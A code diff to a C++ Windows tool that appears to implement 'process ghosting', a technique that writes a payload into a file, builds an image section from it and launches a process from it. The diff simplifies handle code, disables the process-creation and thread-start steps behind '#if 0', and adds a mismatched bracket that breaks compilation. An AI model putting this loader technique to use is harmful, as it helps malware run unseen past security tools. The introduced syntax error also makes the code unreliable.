@@ -62,9 +62,8 @@ wmain(const int argc, const wchar_t** argv) -> int
     //
     {
         auto const FileSize = ValueOr<usize>(PayloadFile.Size(), 0);
-        auto hMap           = UniqueHandle {Value(PayloadFile.Map(PAGE_READONLY))};
-        auto View           = PayloadFile.View(hMap.get(), FILE_MAP_READ, 0, FileSize);
-        auto hView          = FileSystem::FileMapViewHandle {Value(View)};
+        auto hMap           = Value(PayloadFile.Map(PAGE_READONLY));
+        auto hView          = Value(PayloadFile.View(hMap.get(), FILE_MAP_READ, 0, FileSize));
         DWORD bytesWritten {};
         ::WriteFile(GhostFile.Handle(), hView.get(), FileSize, &bytesWritten, nullptr);
     }
@@ -107,6 +106,8 @@ wmain(const int argc, const wchar_t** argv) -> int
     GhostFile.Close();
 
 
+    // TODO restore
+#if 0
     //
     // 6. Create a process using the image section.
     //
@@ -133,13 +134,15 @@ wmain(const int argc, const wchar_t** argv) -> int
         return EXIT_FAILURE;
     }
 
-    Process::Process GhostedProcess {::GetProcessId(hProcess.get()), hProcess.get()};
+    Process::Process GhostedProcess(::GetProcessId(hProcess.get()), hProcess.get()};
     ok("Process created with PID={}", GhostedProcess.ProcessId());
 
 
     //
     // 7. Assign process arguments and environment variables.
     //
+
+
     auto PebRaw = Value(GhostedProcess.Memory.Read((uptr)GhostedProcess.ProcessEnvironmentBlock(), sizeof(PEB)));
     auto Peb    = reinterpret_cast<PEB*>(PebRaw.data());
     Binary::PE PeTarget {GhostProcessPath};
@@ -182,6 +185,7 @@ wmain(const int argc, const wchar_t** argv) -> int
        hThread.get(),
        StartAddress,
        GhostedProcess.ProcessId());
+#endif
 
     Utils::Pause();
 
